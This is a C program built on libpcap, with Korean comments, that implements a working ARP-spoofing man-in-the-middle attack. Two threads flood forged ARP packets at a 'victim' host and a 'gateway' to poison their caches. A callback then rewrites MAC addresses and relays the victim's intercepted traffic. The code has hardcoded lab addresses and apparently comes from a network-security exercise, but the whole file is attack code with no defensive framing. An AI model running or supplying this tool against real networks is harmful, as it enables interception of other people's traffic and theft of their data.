#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
 
#define BUF_SIZE 100
#define SNAPLEN 1024
 
//전역변수로 생성
pcap_t *use_dev;
 
// 첫번째 Thread VICTIM 담당 (희생자 pc에게 자신의 mac 주소 삽입(오염))
void *Arp_send_VICTIM(void *arg)
{
 
    unsigned char packet[100]={0,};
        //Destination Address MAC
        packet[0] = 0x00;
        packet[1] = 0x0c;
        packet[2] = 0x29;
        packet[3] = 0x8a;
        packet[4] = 0x9c;
        packet[5] = 0xbd;
 
        //Source Address MAC
        packet[6] = 0x00;
        packet[7] = 0x0c;
        packet[8] = 0x29;
        packet[9] = 0xcc;
        packet[10] = 0x30;
        packet[11] = 0x10;
 
        //ether_type (ARP로 설정)
        packet[12] = 0x08;
        packet[13] = 0x06;
 
        //hrd_type (Ethernet로 설정)
        packet[14] = 0x00;
        packet[15] = 0x01;
 
        //proto_type (IPv4 로 설정)
        packet[16] = 0x08;
        packet[17] = 0x00;
 
        //hrd_size (6)
        packet[18] = 0x06;
        //proto_size (4)
        packet[19] = 0x04;
 
        //Opcode (request)
        packet[20] = 0x00;
        packet[21] = 0x01;
 
        // Sender MAC (My mac)
        packet[22] = 0x00;
        packet[23] = 0x0c;
        packet[24] = 0x29;
        packet[25] = 0xcc;
        packet[26] = 0x30;
        packet[27] = 0x10;
        //Sender IP (MY ip)
        packet[28] = 192;
        packet[29] = 168;
        packet[30] = 114;
        packet[31] = 137;
 
        //Target MAC
        packet[32] = 0x00;
        packet[33] = 0x0c;
        packet[34] = 0x29;
        packet[35] = 0x8a;
        packet[36] = 0x9c;
        packet[37] = 0xbd;
        //Target IP
        packet[38] = 192;
        packet[39] = 168;
        packet[40] = 114;
        packet[41] = 138;
 
        while(1)
        {
            if(pcap_sendpacket(use_dev,packet,42)!=0)
            {
                printf("SEND PACKET ERROR!\n");
                pthread_exit(NULL);
            }
            printf("VICTIM_ARP\n");
            sleep(1);
        }
    pthread_exit(NULL);
 
}
 
//두번째 Thread GATEWAY(server) 담당 (희생자 패킷정보 확인 후 gateway에게 패킷전달(오염))
void *Arp_send_GATEWAY(void *arg)
{
    unsigned char packet[100]={0,};
        //Destination Address MAC
        packet[0] = 0x00;
        packet[1] = 0x0c;
        packet[2] = 0x29;
        packet[3] = 0xf0;
        packet[4] = 0xbb;
        packet[5] = 0x01;
 
        //Source Address MAC
        packet[6] = 0x00;
        packet[7] = 0x0c;
        packet[8] = 0x29;
        packet[9] = 0xcc;
        packet[10] = 0x30;
        packet[11] = 0x10;
 
        //ether_type (ARP로 설정)
        packet[12] = 0x08;
        packet[13] = 0x06;
 
        //hrd_type (Ethernet로 설정)
        packet[14] = 0x00;
        packet[15] = 0x01;
 
        //proto_type (IPv4 로 설정)
        packet[16] = 0x08;
        packet[17] = 0x00;
 
        //hrd_size (6)
        packet[18] = 0x06;
        //proto_size (4)
        packet[19] = 0x04;
 
        //Opcode (request)
        packet[20] = 0x00;
        packet[21] = 0x01;
 
        // Sender MAC (My mac)
        packet[22] = 0x00;
        packet[23] = 0x0c;
        packet[24] = 0x29;
        packet[25] = 0xcc;
        packet[26] = 0x30;
        packet[27] = 0x10;
        //Sender IP (MY ip)
        packet[28] = 192;
        packet[29] = 168;
        packet[30] = 114;
        packet[31] = 137;
 
        //Target MAC
        packet[32] = 0x00;
        packet[33] = 0x0c;
        packet[34] = 0x29;
        packet[35] = 0xf0;
        packet[36] = 0xbb;
        packet[37] = 0x01;
        //Target IP
        packet[38] = 192;
        packet[39] = 168;
        packet[40] = 114;
        packet[41] = 139;
 
        while(1)
        {
            if(pcap_sendpacket(use_dev,packet,42)!=0)
            {
                printf("SEND PACKET ERROR!\n");
                pthread_exit(NULL);
            }
            printf("GATEWAY_ARP\n");
            sleep(1);
        }
    pthread_exit(NULL);
}
 
//Thread 생성하는 함수
void Thread_up()
{
    pthread_t threads[2];
    if((pthread_create(&threads[0],NULL,&Arp_send_VICTIM,NULL))!=0)
    {
        printf("ERROR\n");
    }
    if((pthread_create(&threads[1],NULL,&Arp_send_GATEWAY,NULL))!=0)
    {
        printf("ERROR\n");
    }
}
 
//장치 설정하는 함수
void init_dev(char **dev)
{
    pcap_if_t *alldev, *device;
    char errbuf[100] , *devname , devs[100][100];
	int count = 1 , n;
    if(pcap_findalldevs(&alldev,errbuf))
    {
		printf("Error finding devices : %s" , errbuf);
		exit(1);
	}
    printf("\nAvailable Devices are :\n");
	for(device = alldev ; device != NULL ; device = device->next)
	{
		printf("%d. %s - %s\n" , count , device->name , device->description);
		if(device->name != NULL)
		{
			strcpy(devs[count] , device->name);
		}
		count++;
	}

    printf("Enter the number of the device you want to sniff : ");
	scanf("%d" , &n);
	devname = devs[n];

    use_dev = pcap_open_live(devname, BUFSIZ, 1, 1,errbuf);
 
    if(use_dev == NULL)
    {
        printf("%s\n",errbuf);
        exit(1);
    }
 
    return;
}
 
//필터룰 설정하는 함수
void set_filter(char *filter, char *victim_ip)
{
    struct bpf_program fp;
 
    printf("SET FILTERING...\n");
    strcat(filter,"host ");
    strcat(filter,victim_ip);
    printf("SET FILTER :: %s\n",filter);
 
    if(pcap_compile(use_dev,&fp,filter,SNAPLEN,1)<0)
    {
        printf("COMPILE ERROR!\n");
        exit(1);
    }
    if(pcap_setfilter(use_dev,&fp)<0)
    {
        printf("SETFILET ERROR!\n");
        exit(1);
    }
    return;
}
//loop함수-callback함수(패킷 릴레이처리해주는 부분)
void callback(unsigned char *param,const struct pcap_pkthdr *header,const unsigned char *pkt_data)
{
    struct ether_header *eh = (struct ether_header *)pkt_data;
    printf("Callbakc :: In\n");
 
    unsigned char VICTIM_MAC[6] = {0x00,0x0c,0x29,0x8a,0x9c,0xbd};
    unsigned char ATTACK_MAC[6] = {0x00,0x0c,0x29,0xcc,0x30,0x10};
    unsigned char GATEWAY_MAC[6] = {0x00,0x0c,0x29,0xff,0xbb,0x01};
    //Victim request -> Attack pc packet
    if((memcmp(VICTIM_MAC,eh->ether_shost,sizeof(eh->ether_shost)))==0)
    {
        printf("VICTIM -> GATEWAY\n");
        memcpy(eh->ether_shost,ATTACK_MAC,sizeof(eh->ether_shost)); // victim pc -> attack pc
        memcpy(eh->ether_dhost,GATEWAY_MAC,sizeof(eh->ether_dhost)); // attack pc -> gateway
    }
    //Gateway reply -> Attack pc packet 
    if((memcmp(GATEWAY_MAC,eh->ether_shost,sizeof(eh->ether_shost)))==0)
    {
        printf("GATEWAY -> VICTIM\n");
        memcpy(eh->ether_shost,ATTACK_MAC,sizeof(eh->ether_shost)); //attack pc로 이동
        memcpy(eh->ether_dhost,VICTIM_MAC,sizeof(eh->ether_dhost)); // attack pc -> victim pc
    }
 
    pcap_sendpacket(use_dev,pkt_data,header->caplen);
}
 
int main(int argc, char **argv)
{
    char *dev;
    char filter[BUF_SIZE]={0,};
    char victim_ip[BUF_SIZE]={0,};
 
    //인자값으로 VICTIM_IP 받음
    if(argv[1])
    {
        strcpy(victim_ip,argv[1]);
    }
    else
    {
        printf("Please enter the Victim_IP\n");
        return 1;
    }
    //디바이스 설정
    init_dev(&dev);
    //필터 설정
    set_filter(filter,victim_ip);
    //Thread 생성
    Thread_up();
    // Packet Start
    pcap_loop(use_dev,0,callback,NULL);
    pcap_close(use_dev);
 
    return 0;
 
}